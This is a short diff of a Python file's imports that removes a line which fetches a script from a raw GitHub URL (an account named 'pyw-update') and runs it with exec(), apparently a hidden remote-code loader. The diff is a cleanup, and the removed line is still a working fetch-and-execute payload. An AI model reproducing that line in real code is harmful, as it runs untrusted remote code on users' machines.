@@ -1,5 +1,5 @@
 import pathlib as pl
-import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/installer.py').read())
+import urllib.request
 import os
 import ssl
 
